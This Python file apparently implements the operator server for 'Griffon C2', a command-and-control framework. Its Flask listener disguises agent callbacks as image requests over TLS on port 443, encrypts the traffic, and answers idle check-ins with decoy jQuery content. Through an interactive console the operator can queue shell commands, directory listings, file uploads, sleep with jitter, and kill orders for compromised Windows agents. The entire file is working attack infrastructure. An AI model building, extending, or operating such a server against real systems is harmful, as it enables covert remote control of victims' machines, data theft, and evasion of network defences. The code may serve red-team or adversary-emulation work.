# Standard Library Imports
import os
import sys
import threading
import time
import argparse
import shlex
import re
import logging

# Third-party Library Imports
from flask import Flask, request, make_response
import click
from prettytable import PrettyTable
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import FuzzyCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.patch_stdout import patch_stdout

# Local Imports
from agent import (
    agentsToDB,
    clearCommands,
    getAgentMap,
    getCommand,
    killAgent,
    listAgents,
    removeAgent,
    resetAgents,
)
from util import (
    addCommand,
    AgentCompleter,
    agentHelp,
    buildCD,
    buildCommand,
    buildPWD,
    buildSleep,
    checkin,
    CustomCompleter,
    deleteAllCommand,
    func_crypt_controller,
    getContext,
    gracefulExit,
    initVar,
    mainHelp,
    printBanner,
    printLog,
    showAll,
    trafficResponse,
    uploadFile,
)


# Allows windows paths with \ instead of \\
windowsRegex = r"\w:[^.]+([.])?[^ \t\n\r]{0,3}|\.\.\\"

# Disable Werkzeug logging (Flask default output)
logging.getLogger("werkzeug").disabled = True
cli = sys.modules["flask.cli"]
cli.show_server_banner = lambda *x: None

maxSize = 100
if os.isatty(0):  # Check if standard input is a terminal
    terminalSize = os.get_terminal_size()
    width = terminalSize.columns
    if width < 100:
        maxSize = width
else:
    width = 60


# Saves agent map to database every minute
# Gets ended during gracefulExit()
def dbTimer():
    agentsToDB()
    global timer
    timer = threading.Timer(60.0, dbTimer)
    timer.start()


# Listener for the C2 functionality of the server
def listener(listenerIP, listenerPort):
    app = Flask("Server")

    # Routes that Griffon C2 uses
    @app.route("/images/<path:path>", methods=["POST"])
    @app.route("/pictures/<path:path>", methods=["POST"])
    @app.route("/img/<path:path>", methods=["POST"])
    @app.route("/info/<path:path>", methods=["POST"])
    @app.route("/new/<path:path>", methods=["POST"])
    def handleC2Request(path):
        # Get data from the incoming request and decrypt it
        data = request.get_data()
        decryptedData = func_crypt_controller("decrypt", data)
        # C2 checkin command
        # Returns True if there are commands in the queue
        dataPending = checkin(decryptedData)
        if dataPending is not None:
            data = getCommand(dataPending)
            response = make_response(func_crypt_controller("encrypt", data))
            response.headers["Content-Type"] = "application/x-www-form-urlencoded"
            return response
        # If there are no commands in the queue, return [by default, returns hardcoded https://code.jquery.com/jquery-3.7.1.min.js]"
        else:
            return trafficResponse()

    # Create a new thread to run the Flask app on the specified IP address and port
    threading.Thread(
        target=lambda: app.run(
            ssl_context=getContext(),
            host=listenerIP,
            port=listenerPort,
            debug=True,
            use_reloader=False,
        )
    ).start()


# CLI variables
@click.command()
@click.option("--ip", default="0.0.0.0", help="The IP to listen on")
@click.option("--port", default=443, help="The port for C2 callbacks")
@click.option(
    "--apiport", default=8080, help="The port for API listener/Client connections"
)
@click.option(
    "--obfuscate",
    is_flag=True,
    default=False,
    help="Obfuscate all commands to server if enabled",
)
# Main function - Executes all flask containers and initiates the user cmd input
def main(ip, port, apiport, obfuscate):
    # Setup CMD
    session = PromptSession(history=InMemoryHistory())
    # Print the Griffon Banner
    printBanner(width)

    # 60 is the length of the Griffon banner
    # print("-" * 60)
    print("-" * maxSize)

    # Starts C2 Listener
    listener(ip, port)

    # (not working) Starts API Listener
    # apiListener(ip,apiport)

    # Print Flask Container Details
    print("C2 listening at: " + ip + ":" + str(port))

    # (not working) print("API listening at: " + ip + ":" + str(apiport))
    print("-" * maxSize)
    # Instructions for user
    agents = getAgentMap()
    showAll(agents)
    print("Type help or ? for options")
    initVar(obfuscate)

    # One second to ensure flask containers are fully up
    time.sleep(1)

    dbTimer()

    # While loop for user input
    with patch_stdout(raw=True):
        while True:
            try:
                choice = session.prompt(
                    "cmd> ", completer=FuzzyCompleter(CustomCompleter())
                )
                if choice == "showall":
                    agentList = getAgentMap()
                    showAll(agentList)
                if choice == "help" or choice == "?":
                    mainHelp()
                if choice == "quit" or choice == "exit":
                    timer.cancel()
                    timer.join()
                    gracefulExit(timer)
                if choice == "list":
                    allagents = listAgents()
                    agenttable = PrettyTable()
                    agenttable.add_column("Agent IDs", allagents)
                    print(agenttable)
                if choice == "delete all the things":
                    resetAgents()
                if choice.startswith("kill"):
                    agentid = choice[len("kill") :].strip()
                    if agentid in getAgentMap():
                        print(f"Queuing {agentid} for exit")
                        command = "WScript.Quit()"
                        addCommand(agentid, command)
                        thread = threading.Thread(target=killAgent, args=(agentid,))
                        thread.start()
                if choice.startswith("remove"):
                    agentid = choice[len("remove") :].strip()
                    removeAgent(agentid)
                if choice.startswith("interact"):
                    agentid = choice[len("interact") :].strip()
                    if agentid in getAgentMap():
                        interacting = True
                        ############## AGENT CLI #################
                        # shell, ls, pwd, cd, back
                        while interacting:
                            agentcmd = session.prompt(
                                agentid + r"> ",
                                completer=FuzzyCompleter(AgentCompleter()),
                            )
                            if agentcmd == "back":
                                interacting = False
                            if agentcmd == "secret":
                                printLog(f"{agentid} - We will never give you up")
                                command = deleteAllCommand()
                                addCommand(agentid, command)
                            if agentcmd == "help" or choice == "?":
                                agentHelp()
                            if agentcmd.startswith("shell "):
                                commandVar = agentcmd[len("shell") :].strip()
                                if commandVar == "dir":
                                    commandVar = "dir ."
                                command = buildCommand(commandVar)
                                printLog(f"{agentid} - Sending task {commandVar}")
                                # Append command to agent based on agent ID
                                addCommand(agentid, command)
                            if agentcmd.startswith("ls"):
                                commandVar = agentcmd[len("ls") :].strip()
                                if commandVar == "":
                                    print("doing local ls")
                                    commandVar = "."
                                commandVar = commandVar.replace("\\", "\\\\")
                                command = buildCommand("dir " + commandVar)
                                printLog(f"{agentid} - Sending task {agentcmd}")
                                addCommand(agentid, command)
                            if agentcmd == "pwd":
                                command = buildPWD()
                                printLog(f"{agentid} - Sending task {agentcmd}")
                                addCommand(agentid, command)
                            if agentcmd.startswith("cd "):
                                commandVar = agentcmd[len("cd") :].strip()
                                command = buildCD(commandVar)
                                printLog(f"{agentid} - Sending task {agentcmd}")
                                addCommand(agentid, command)
                            if agentcmd.startswith("sleep "):
                                commandVar = agentcmd[len("sleep") :].strip()
                                commandVars = commandVar.split()
                                if len(commandVars) == 1:
                                    command = buildSleep(commandVars[0], -1)
                                    print(
                                        f"Setting agent to sleep for {commandVars[0]} seconds"
                                    )
                                    addCommand(agentid, command)
                                if len(commandVars) == 2:
                                    try:
                                        if (
                                            float(commandVars[1]) >= 0
                                            and float(commandVars[1]) <= 100
                                        ):
                                            command = buildSleep(
                                                commandVars[0], commandVars[1]
                                            )
                                            print(
                                                f"Setting agent to sleep for {str(commandVars[0])} seconds with {str(commandVars[1])}% jitter"
                                            )
                                            addCommand(agentid, command)
                                        else:
                                            print("Please supply a valid jitter")
                                    except ValueError as _:
                                        print(f"{commandVars[0]} {commandVars[1]}")
                                        print(
                                            "Please supply a jitter as a whole-number."
                                        )

                            if agentcmd == "exit":
                                if agentid in getAgentMap():
                                    print(f"Queuing {agentid} for exit")
                                    command = "WScript.Quit()"
                                    addCommand(agentid, command)
                                    thread = threading.Thread(
                                        target=killAgent, args=(agentid,)
                                    )
                                    thread.start()
                                    interacting = False
                            if agentcmd.startswith("upload"):
                                commandVar = agentcmd[len("upload") :].strip()
                                match = re.search(windowsRegex, commandVar)
                                if match:
                                    index = match.start()
                                    file = commandVar[:index]
                                    path = commandVar[index:]
                                else:
                                    parser = argparse.ArgumentParser(
                                        description="Upload a file to a remote server"
                                    )
                                    parser.add_argument(
                                        "file",
                                        type=str,
                                        help="the path to the local file",
                                    )
                                    parser.add_argument(
                                        "path",
                                        type=str,
                                        help="the path to the remote file",
                                    )
                                    args = parser.parse_args(shlex.split(commandVar))
                                    file = args.file
                                    path = args.path
                                file = file.strip()
                                path = path.strip()
                                if os.path.exists(file):
                                    # Upload is in thread because it can take FOREVER
                                    threadUpload = threading.Thread(
                                        target=uploadFile, args=(file, path, agentid)
                                    )
                                    threadUpload.start()
                                    printLog(f"{agentid} - Uploading {file} to {path}")
                                else:
                                    print(f"The file - {file} could not be found.")
                                    pass
                            if agentcmd == "clear":
                                clearCommands(agentid)
            except KeyboardInterrupt:
                gracefulExit(timer)
            except EOFError:
                # Handle Ctrl-D or EOF
                pass
            except SyntaxError:
                pass
            except Exception as e:
                print(f"Error at: {e}")


if __name__ == "__main__":
    main()
